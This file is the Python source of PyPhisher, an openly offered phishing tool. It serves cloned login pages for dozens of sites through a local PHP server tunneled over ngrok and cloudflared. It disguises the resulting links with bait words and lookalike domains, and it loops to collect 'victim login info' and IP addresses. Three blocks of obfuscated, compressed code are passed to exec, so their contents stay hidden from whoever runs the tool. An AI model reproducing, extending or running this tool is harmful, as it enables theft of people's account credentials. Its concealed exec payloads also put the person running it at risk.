# -*- coding: UTF-8 -*-
# ToolName   : PyPhisher
# Author     : KasRoudra
# Version    : 1.7
# License    : GPL V3
# Copyright  : KasRoudra (2021-2022)
# Github     : https://github.com/KasRoudra
# Contact    : https://m.me/KasRoudra
# Description: PyPhisher is a phishing tool in python
# Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 40+ other sites available
# 1st Commit : 08/08/2021
# Language   : Python
# Portable file/script
# If you copy open source code, consider giving credit
# Credits    : Zphisher, MaskPhish

"""
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
"""


_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'DA96106DF1DFDF5FBF07ED8014540A1302E2914715D4B0B8CB7B5BB53DB0107919495868018825E75101F6557FBB64AB8E9D9DF5FC590BE338F83F361E87E2B7EDF091AE46E45A63B34E156F5D954B1D48BA206315A793E0E94891A60485B9EA5F7851AD83F6FDFBF8C558D19AF099929BE13F1F2939DCA49F67A8381A8E354819E48B0AF3DC0F95A9CA2B89374B6B0E1D2A3401C57790B90005F86A36F4041D2EA1AEABDCA631EC9980BD8CC1790768480FC18EDE029193522FF22B5003464D8A5C745AEE4A33DEDA0D95D213998B23457110DE5B08E1609E1FC3C1CF4009D367340B50108C96BC57B1B8456D6FCC2115841814E7F7F5FDFDFAFAFDFCFD7EBF606C602E97F949786B9884D80A8174EF8173BB72B28004D1D8BC1551C987'))


# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="1.7"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

# Generated by banner-generator. Github: https://github.com/KasRoudra/banner-generator

logo=f'''
{red}  _____       _____  _     _     _               
{cyan} |  __ \     |  __ \| |   (_)   | |              
{yellow} | |__) |   _| |__) | |__  _ ___| |__   ___ _ __ 
{blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
{red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
{yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
{green}         __/ |                          {cyan}[v{version}]
{cyan}        |___/                   {red}[By KasRoudra]
'''


pkgs=[ "php", "curl", "wget", "unzip" ]


try:
    test = popen("cd $HOME && pwd")
except:
    exit()

root = popen("cd $HOME && pwd").read().strip()

supported_version = 3

if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)

choice_file = "files/templates.json"

# Check termux
if exists("/data/data/com.termux/files/home"):
    termux=True
else:
    termux=False

# Get package manager
if system("command -v apt > /dev/null 2>&1")==0:
    apt=True
else:
    apt=False
if system("command -v apt-get > /dev/null 2>&1")==0:
    aptget=True
else:
    aptget=False
if system("command -v sudo > /dev/null 2>&1")==0:
    sudo=True
else:
    sudo=False
if system("command -v pacman  > /dev/null 2>&1")==0:
    pacman=True
else:
    pacman=False
if system("command -v yum > /dev/null 2>&1")==0:
    yum=True
else:
    yum=False
if system("command -v dnf > /dev/null 2>&1")==0:
    dnf=True
else:
    dnf=False
if system("command -v brew > /dev/null 2>&1")==0:
    brew=True
else:
    brew=False
if system("command -v apk > /dev/null 2>&1")==0:
    apk=True
else:
    apk=False
    
# Check if mac has tunneler binaries
if brew:
    if system("command -v ngrok > /dev/null 2>&1")==0:
        ngrok=True
    else:
        ngrok=False
    if system("command -v cloudflared > /dev/null 2>&1")==0:
        cloudflared=True
    else:
        cloudflared=False
else:
    ngrok=False
    cloudflared=False

print(f"\n{info}Please wait!\n")

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'===OM4IDR77O5VH65XY74H42W4JIRMBKVVUOFA4YKAJ6M6RYMIQQGXV543K6J3MQPON4UO5O62LIZ6B5XB7AGLGVXIPXD2GCYLJB7SUKOO3X7PN35U7ARDLDVKNERLAMXDIIIXFEVSTGTDMT2TLSIHBD7KGOAG6LEZC33JMCMOXYU7Q327XMEWXYFBW4Q3NRXRAH2GMSWUR5HWW3N4IFHDOJF7DKJNDF6BSYSDYQM3BX2IZ6ZPHL4WBTCPQ6ESK7MXYRED7QHJX7OBOPRBVSEWNAMM3LS4AZYS7Y7NSSI4QQ43UH7Y3FVN5VQ5JDRYR2DPZEC72YR65LNLNB5LYQRAEB5BCHWROVMOQWYS66NA335BEZB4PSFDYFXLUKSBUY77LVLIQ4GSOMGNEIRZ6PEP4VZ5PTKIWQZMKJIYG3MUQVVJZQNSTX52LVRVORX2233YSGTXQTSM2PNRHZFY35TEOWCCPYWGYSPUT3MQ6CFHP7FCRMEEORL4S4IF3UGDVRXEQUJ4AY3GHD6AXPLBCDH5RKODLMJ7DP6HTMYRA3XGKMFTCLNNY7FBWGQPDMJRUDJ4DFCUEB34EFNCZ2ZTTFNFKQ3YE2FRTVTBVX5A6F5ULQLNLTLEDEKPIQZRYH57BJLPBSWKA3MQGSK3ECNRU45IZHKWCIRM723IQ632ZQQFUWKEREGUC3FAIK3ZIDAJJ7HZTDE6B56DYZJ7QXC6XJKAKRFZAND5KGCR7DV4W56P36RFF5GCVA6XZXZ22ZCGROM5CUNHOXEH7KYS5NPUVAHOGGKATGG3ZVPVE3JQEALB4FYSNFFXO4MAOPR7EZPODJVTOGBM42SVRI4JY55DBOPM6YROAIMOVYN5CGRY2KBQ5RSMS2DYMQMEFGQU72P6E6SNGSQI3SUQGFJDVD7FFB7K7OWB7WCTC3XNHC5DBLQDHWXMFZRLHWE6NFCSCZX244BFVLYMRP72R3IDQQL3JPZFMAK4QXXVVRHS52H37BYQUT7T3TQYEC63LTX2GU56F2UGPXX3EL3K6KJDMPQUARXBAJ22EOVG5K3IAPCHIQO5KVLYXFVLCTTB53T55XLEY6A7KNMP36VHCL3YN5DKF3HJNAXKSLSTJCWNL4H67SV4GQHAWLDA3I4FCGBO43SRPWOOUO6GAGUDUVLWV7RDWBM4RHKF3YXTZYV5WGIB3FQ2OGZJDI5WBW67GR7WC7GP5ILKXT5T5T3W2OCUF3HUKIIPM7QWKWEYFP6JTNBHYORXRHGUKRFS7OGICIGL2KQW6Q7WWS6LANNUQ5JRXDVISS33OFOWZHXJGWZO4PEG7TJ5LC2VVE4GDK4YKWILZIJIHCRA5DHVAS5LX6YAOBTNRO3AYMOQEFRH3WRARVPCEPEXJ5R5M2FT2B5FM5543H5AYTRIOJFVFTYEH3ZAKP3TFU6JX32IRUQALXFMSPWFDJ37FCGQA2BKBKY4U5SROTIPUQ2NQGE6DG2X5AOJWLXI37FQCR64UZEQDWUGBUM4FGKF4OGSALLXMPX5RHIFGV7B3DEJBRREORRE3LWRTAAIDK3CRSL3PHSQFWHX5NEH4BHOW2PGRQXZQMXQJ4KXKJKIXBFDNHNLCCK5XHABZIKVPJR6JA76KWCS4RXREINZ2WQMZSYDKFVAQ3ANCVR5YI5ZZVXXKZO7FA3F34TK3G4IL2Q3QAKLFFJA5TVNVEKECL63O3XXDB4VTIHWOM6BTM7Y2XV5X6PSJGWB6KQ6CWXQFVYW2S6D3SYCLXVC3QAEEOJYMTRZOWZL3XCCTF3DJBFVASLADFZCJAGLGVRN4SWJ3GMTI745V6NKJR6FJ3W74BEFPJ3Z5CHVGDINUQM3JYJIOUKPPJEEUIHIQ224ORCWG3D5AI6S43B644O4J6Z2G43S7UTFBTGJOQNCMDB5MGZDMG6AGLCIQUAVR4MA4526CKONWVCEESXOQVGJNJLYIN5QHAYQIDSIBROEN5JAAR5NIG3RRZVXK4GWH6T6BVFHZH7S6QQ25NYGF7MI3QHTX3M53FJ7L23ENDL5CXFZXO45T757763P6ZP643P77P7J7PO43MCEQACIABDO4R43BYQMMELCD3ENC3LBKZ25SXXR5RFCEMDM3BHKFLBOCP'))




# Polite Exit
def pexit():
    killer()
    sprint(f"\n{info2}Thanks for using!\n{nc}")
    exit(0)


# Install packages in Termux and Mac
def installer(pm):
    for pkg in range(0, len(pkgs)):
        if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
            sprint(f"\n{info}Installing {pkgs[pkg].upper()}{nc}")
            system(f"{pm} install -y {pkgs[pkg]}")

# Install packages in Linux
def sudoinstaller(pm):
    for pkg in range(0, len(pkgs)):
        if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
            sprint(f"{info}Installing {pkgs[pkg].upper()}{nc}")
            system(f"sudo {pm} install -y {pkgs[pkg]}")



# Process killer
def killer():
    if system("pidof php > /dev/null 2>&1")==0:
        system("killall php")
    if system("pidof ngrok > /dev/null 2>&1")==0:
        system("killall ngrok")
    if system("pidof cloudflared > /dev/null 2>&1")==0:
        system("killall cloudflared")
    if system("pidof curl > /dev/null 2>&1")==0:
        system("killall curl")
    if system("pidof wget > /dev/null 2>&1")==0:
        system("killall wget")
    if system("pidof unzip > /dev/null 2>&1")==0:
        system("killall unzip")



# Website chooser
def show_options(sites):
    leng=len(sites)
    i=0
    j=int(leng/3)
    k=int((2*leng)/3)
    if leng%3!=0:
        j+=1
        k+=1
    m=j
    while i<m:
        print(f"{green}[{white}{str(i+1)}{green}] {yellow}{sites[i]}", end="")
        lew=len(sites[i])
        sp=22-lew
        if i<9:
            sp=sp+1
        for s in range(sp):
            print(" ",end="")
        print(f"{green}[{white}{str(j+1)}{green}] {yellow}{sites[j]}", end="")
        lew=len(sites[j])
        sp=16-lew
        for s in range(sp):
            print(" ",end="")
        if k<leng:
            print(f"{green}[{white}{str(k+1)}{green}] {yellow}{sites[k]}", end="")
        i+=1
        j+=1
        k+=1
        print()
    print()
    print(f"{green}[{white}x{green}]{yellow} About                  {green}[{white}m{green}]{yellow} More tools       {green}[{white}0{green}]{yellow} Exit")
    print()
    print()


# Info about tool
def about():
    system("clear")
    sprint(logo, 0.01)
    print(f"{red}[ToolName]  {cyan} :[PyPhisher] ")
    print(f"{red}[Version]   {cyan} :[{version}] ")
    print(f"{red}[Author]    {cyan} :[KasRoudra] ")
    print(f"{red}[Github]    {cyan} :[https://github.com/KasRoudra] ")
    print(f"{red}[Messenger] {cyan} :[https://m.me/KasRoudra] ")
    print(f"{red}[Email]     {cyan} :[kasroudrakrd@gmail.com] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}99{green}]{yellow} Main Menu       \n")
    abot= input("\n > ")
    if abot== "0":
        pexit()
    else:
        main()
        

# Copy website files from custom location
def customfol():
    fol=input(f"\n{ask}Enter the directory > {green}")
    mask=input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
    mask = "https://" + sub("(/| )", "-", mask)
    if exists(fol):
        if isfile(f"{fol}/index.php"):
            system(f'cd "{fol}" && rm -rf ip.txt usernames.txt && cp -r * $HOME/.site')
            server(mask)
        else:
            sprint(f"{error}Index.php required but not found!")
            main()
    else:
        sprint(f"{error}Directory do not exists!")
        main()


# Update of PyPhisher
def updater():
    internet()
    git_ver=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").read().strip()
    if (version != git_ver and git_ver != "404: Not Found"):
        changelog=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").read()
        system("clear")
        print(logo)
        print(f"{info}PyPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
        upask=input(f"\n{ask}Do you want to update PyPhisher?[y/n] > {green}")
        if upask=="y":
            print(nc)
            system("cd .. && rm -rf PyPhisher pyphisher && git clone https://github.com/KasRoudra/PyPhisher")
            sprint(f"\n{success}PyPhisher has been updated successfully!! Please restart terminal!")
            if (changelog != "404: Not Found"):
                sprint(f"\n{info2}Changelog:\n{purple}{changelog}")
            exit()
        elif upask=="n":
            print(f"\n{info}Updating cancelled. Using old version!")
            sleep(2)
        else:
            print(f"\n{error}Wrong input!\n")
            sleep(2)

# First function main
_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__[::-1]));exec((_)(b'=Q+k1j3H93f+8X18MWkodnhC4CuINoepNqFnKAi1wlCjIpSpF71tPX8aX4sitxWokQi0G2DiLBGMUKXBkKbIwrY9ZK2oTVksFAJrsT/YVGWwf5uzmelUzNA+BNbeZOP8uLV3R/1ZFYdTciaNJEexaK7VhaODvPbfHJFFPLNDZdoU5lRUwhOkUxeg0kWQjscUoBY0d3opMpco2kK1Rgl9MINYun27HYr+M5kHGQ41jlABaR9JTFVwEEWrA5d1NzPZPMO9GUzx3slK8YFLiU96IWyLv3epevNDjGmVVmRT7D0Hwk9NkzmIItLrm+eKt/hApuuLr9ZfF6xmyqy4LAlqdxoytPdpHT91OXvTVgdQ5cQQABJ2oKTy6wvNi9U6siruJMp3CTiud7GY7Gvhdt+qQV7ohoiUSRsUNdU50306A968YRz7yHUufhbOIRDD6WydhzeBPC8UhEjy8ROSUg+5d0CErK8rLE6vl9xMamDS0ZrCMum56sfqiJ/ZcYOHtwaQbNmFPxNF2UiGS8jufGzVsD8bFuXrtiCDmB8q3DEHYrWA81nU2yuS48ork5iYu+aizGT6OfUryIfeVP9Mz4Yqg2BWZD5QeJiBoMJBVDE7XesCVioNmvSjvtFS26LeW4R9c2+lL3dkW/FCTng35ttNxfaETTch8yTvEqewiuQLzOxMDpLofnn1TUWPEIGW9b8sRQsYAmPLTSlHFFsUC+ZMRNHLO3JPilTpcp7+p7fB3BYXuN4+9kE+6XS2yFRVe7hhLZp8MTzlC7UXQvtKVOJEAzEjRn+EqwecsOZDFHY/KUOFLdaPLEW7FCU6AzYbIFFAi7u5IhVRq6YsqCV34HdXFBpyrDkDq8fLZ8wj5zf+XmAL8HQp+lWyjQqjOMOYpg/Zj6NJjlunopdZ/lNmdZNPKZe7IBd+2pug0JSgnEa8lmnWBUshrG2Uje4hHDhctlBxRp7W5MEHuS2gX3XSCzw5vQmVd2WrEY7xVZbbN676/BGwtSFSVKgPdmIcbCVfXlXG1NBpIQKHqc0N+0TbHJXk/IiTKd5NDbkg8WFOYew5+wNwaZr43gPiKMpEENIweAaGQGdNV6eUtqw0ibCcu5xh1lmj5+xjXY3Gk3Rqqc0uz9oZ+NKTAp/FLbT+BHWKHRAQKL+p4ArFyhdPMtB/7PhsWs0Q4vnSXxXd4jcH0nxQbzrHA3GhHnAeA/8N1fEPe+/f/I9f+9/nfKrKijMjF23PP1lwwbSbFGu6oA3LFdrAB/P9jDMAAgFpyW00NwJe'))

# 2nd function installing packages and downloading tunnelers
def prerequiments():
    internet()
    if termux:
        if system("command -v proot > /dev/null 2>&1")!=0:
            sprint(f"\n{info}Installing proot{nc}")
            system("pkg install proot -y")
        installer("pkg")
    else:
        if sudo and apt:
            sudoinstaller("apt")
        elif sudo and apk:
            sudoinstaller("apk")
        elif sudo and yum:
            sudoinstaller("yum")
        elif sudo and dnf:
            sudoinstaller("dnf")
        elif sudo and aptget:
            sudoinstaller("apt-get")
        elif sudo and pacman:
            for pkg in range(0, len(pkgs)):
                if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
                    sprint(f"\n{info}Installing {pkgs[pkg].upper()}{nc}")
                    system(f"sudo pacman -S {pkgs[pkg]} --noconfirm")
        elif brew:
            installer("brew")
        elif apt:
            installer("apt")
        else:
            sprint(f"\n{error}Unsupported package manager. Install packages manually!{nc}")
            exit(1)
    if system("command -v php > /dev/null 2>&1")!=0:
        sprint(f"{error}PHP cannot be installed. Install it manually!{nc}")
        exit(1)
    if system("command -v unzip > /dev/null 2>&1")!=0:
        sprint(f"{error}Unzip cannot be installed. Install it manually!{nc}")
        exit(1)
    if system("command -v curl > /dev/null 2>&1")!=0:
        sprint(f"{error}Curl cannot be installed. Install it manually!{nc}")
        exit(1)
    killer()
    architecture=popen("uname -m").read()
    platform=popen("uname").read()
    if not exists(f"{root}/.ngrokfolder"):
        system("mkdir $HOME/.ngrokfolder")
    if not exists(f"{root}/.cffolder"):
        system("mkdir $HOME/.cffolder")
    if not isfile(f"{root}/.ngrokfolder/ngrok") or (brew and not ngrok):
        sprint(f"\n{info}Downloading ngrok.....{nc}")
        internet()
        system("rm -rf ngrok.zip ngrok.tgz")
        if platform.find("Linux")!=-1:
            if architecture.find("aarch64")!=-1:
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz -O ngrok.tgz")
                system("tar -zxf ngrok.tgz > /dev/null 2>&1 && rm -rf ngrok.tgz")
            elif architecture.find("arm")!=-1:
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1 ")
            elif architecture.find("x86_64")!=-1:
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1")
            else:
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1")
        elif platform.find("Darwin")!=-1:
            if architecture.find("x86_64")!=-1:
                system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip' -O 'ngrok.zip'")
                system("unzip ngrok.zip > /dev/null 2>&1")
            elif architecture.find("arm64")!=-1:
                system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip' -O 'ngrok.zip'")
            else:
                print(f"{error}Device architecture unknown. Download ngrok manually!")
                system("brew install ngrok/ngrok/ngrok")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        system("rm -rf ngrok.zip")
        system("mv -f ngrok $HOME/.ngrokfolder")
        if sudo:
            system("sudo chmod +x $HOME/.ngrokfolder/ngrok")
        else:
            system("chmod +x $HOME/.ngrokfolder/ngrok")
    if not isfile(f"{root}/.cffolder/cloudflared") or (brew and not cloudflared):
        sprint(f"\n{info}Downloading cloudflared.....{nc}")
        internet()
        system("rm -rf cloudflared cloudflared.tgz")
        if platform.find("Linux")!=-1:
            if architecture.find("aarch64")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared")
            elif architecture.find("arm")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared")
            elif architecture.find("x86_64")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared")
            else:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared")
        elif platform.find("Darwin")!=-1:
            if architecture.find("x86_64")!=-1:
                system("wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz' -O 'cloudflared.tgz'")
                system("tar -zxf cloudflared.tgz > /dev/null 2>&1")
            else:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")
                system("brew install cloudflare/cloudflare/cloudflared")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        system("rm -rf cloudflared.tgz")
        system("mv -f cloudflared $HOME/.cffolder")
        if sudo:
            system("sudo chmod +x $HOME/.cffolder/cloudflared")
        else:
            system("chmod +x $HOME/.cffolder/cloudflared")
    if system("pidof php > /dev/null 2>&1")==0:
        sprint(f"{error}Previous php still running! Please restart terminal and try again{nc}")
        pexit()
    if system("pidof ngrok > /dev/null 2>&1")==0:
        sprint(f"{error}Previous ngrok still running. Please restart terminal and try again{nc}")
        pexit()
    system("rm -rf $HOME/.site && cd $HOME && mkdir .site")


# 3rd function checking requirements and download files 
def requirements(folder, mask):
    if isfile(f"{root}/.websites/version.txt"):
        with open(f"{root}/.websites/version.txt", "r") as sites_file:
            zipver=sites_file.read().strip()
            if zipver!=version:
                sprint(f"\n{info}Downloading required files.....\n")
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/websites.zip -O websites.zip")
    else:
        sprint(f"\n{info}Downloading required files.....\n")
        system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/websites.zip -O websites.zip")
    if isfile("websites.zip"):
        system("rm -rf $HOME/.websites && cd $HOME && mkdir .websites")
        system("unzip websites.zip -d $HOME/.websites > /dev/null 2>&1")
        remove("websites.zip")
    if exists(f"{root}/.websites/{folder}"):
        system(f"cp -r $HOME/.websites/{folder}/* $HOME/.site")
    else:
        internet()
        sprint(f"\n{info}Downloading required files.....\n")
        system("rm -rf site.zip")
        system(f"wget -q --show-progress https://github.com/KasRoudra/files/raw/main/phishingsites/{folder}.zip -O site.zip")
        if not exists(f"{root}/.websites/{folder}"):
            system(f"cd $HOME/.websites && mkdir {folder}")
        system(f"unzip site.zip -d $HOME/.websites/{folder}")
        remove("site.zip")
        system(f"cp -r $HOME/.websites/{folder}/* $HOME/.site")
    server(mask)

# Start server and tunneling
def server(mask):
    system("clear")
    sprint(logo, 0.01)
    if termux:
        sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
        sleep(1)
    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
    internet()
    system(f"cd $HOME/.site && php -S {local_url} > /dev/null 2>&1 &")
    sleep(2)
    if not system(f"curl --output /dev/null --silent --head --fail {local_url}"):
        sprint(f"\n{info}PHP Server has started successfully!")
    else:
        sprint(f"\n{error}PHP Error")
        pexit()
    sprint(f"\n{info2}Initializing tunnelers at same address.....")
    internet()
    system("rm -rf $HOME/.cffolder/log.txt")
    if system("command -v termux-chroot > /dev/null 2>&1")==0:
        system(f"cd $HOME/.ngrokfolder && termux-chroot ./ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
    elif brew and ngrok and cloudflared:
        system(f"cd $HOME/.ngrokfolder && ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.cffolder && cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
    else:
        system(f"cd $HOME/.ngrokfolder && ./ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.cffolder && ./cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
    sleep(9)
    ngrok_link=popen("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[-0-9a-z]*\.ngrok.io'").read()
    if ngrok_link.find("ngrok")!=-1:
        ngrok_check=True
    else:
        ngrok_check=False
    if isfile(f"{root}/.cffolder/log.txt"):
        cf_link=popen("cat $HOME/.cffolder/log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read()
    else:
        cf_link=""
        sprint(f"\n{error}Cloudflared failed to start!{nc}")
    if cf_link.find("cloudflare")!=-1:
        cf_check=True
    else:
        cf_check=False
    if ngrok_check and cf_check:
        url_manager(cf_link, mask, "1", "2")
        url_manager(ngrok_link, mask, "3", "4")
        cuask(cf_link)
    elif not ngrok_check and cf_check:
        url_manager(cf_link, mask,  "1", "2")
        cuask(cf_link)
    elif not cf_check and ngrok_check:
        url_manager(ngrok_link, mask, "1", "2")
        cuask(ngrok_link)
    elif not (cf_check and ngrok_check):
        sprint(f"\n{error}Tunneling failed! Use your own tunneling service on port {port}!{nc}")
        waiter()
    else:
        sprint(f"\n{error}Unknown error!")
        pexit()


# Output urls
def url_manager(url, mask, num1, num2):
    sprint(f"\n{success}Your urls are given below:")
    print(f"\n{info2}URL {num1} > {yellow}{url}")
    print(f"{info2}URL {num2} > {yellow}{mask}@{url.replace('https://','')}")


# Ask to mask url
def cuask(url):
    cust= input(f"\n{ask}{bcyan}Wanna try custom link?(y or press enter to skip) > ")
    if not cust=="":
        masking(url)
    waiter()

# Optional function for ngrok url masking
def masking(url):
    website= "https://is.gd/create.php\?format\=simple\&url\="+url.strip()
    internet()
    resp= popen(f"curl -s {website} | head -n1").read()
    if not resp.find("https://")!=-1:
        sprint(f"{error}Service not available!\n{resp}")
        waiter()
    short= resp.replace("https://", "")
    domain= input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
    if domain=="":
        sprint(f"\n{error}No domain!")
    else:
        domain = sub("(/| )", ".", sub("https?://", "", domain))
        domain= "https://"+domain+"-"
    bait= input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
    if bait=="":
        sprint(f"\n{error}No bait word!")
    else:
        bait = sub("(/| )", "-", bait)+"@"
    final= domain+bait+short
    sprint(f"\n{success}Your custom url is > {bgreen}{final}")
    waiter()

# Last function capturing credentials
def waiter():
    system("rm -rf $HOME/.site/ip.txt")
    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
    try:
        while True:
            if isfile(f"{root}/.site/usernames.txt"):
                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
                with open(f"{root}/.site/usernames.txt","r") as ufile:
                    userdata=ufile.readlines()
                    useri=0
                    userlen=len(userdata)
                    while useri<userlen:
                        print(f"{cyan}[{green}*{cyan}] {yellow}{userdata[useri]}",end="")
                        useri+=1
                print(f"\n{info}Saved in usernames.txt")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                system("cat $HOME/.site/usernames.txt >> usernames.txt")
                remove(f"{root}/.site/usernames.txt")
            sleep(0.75)
            if isfile(f"{root}/.site/ip.txt"):
                print(logo)
                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                with open(f"{root}/.site/ip.txt","r") as ipfile:
                    ipdata=ipfile.readlines()
                    ipi=0
                    iplen=len(ipdata)
                    while ipi<iplen:
                        print(f"{cyan}[{green}*{cyan}] {yellow}{ipdata[ipi]}",end="")
                        ipi+=1
                print(f"\n{info}Saved in ip.txt")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                system("cat $HOME/.site/ip.txt >> ip.txt")
                system("rm -rf $HOME/.site/ip.txt")
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        system("stty -echoctl") # Skip printing ^C
        if update:
            updater()
        main()
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        try:
            exception_handler(e)
        except:
            exit()
            
# If this code helped you, consider staring repository. Your stars encourage me a lot!
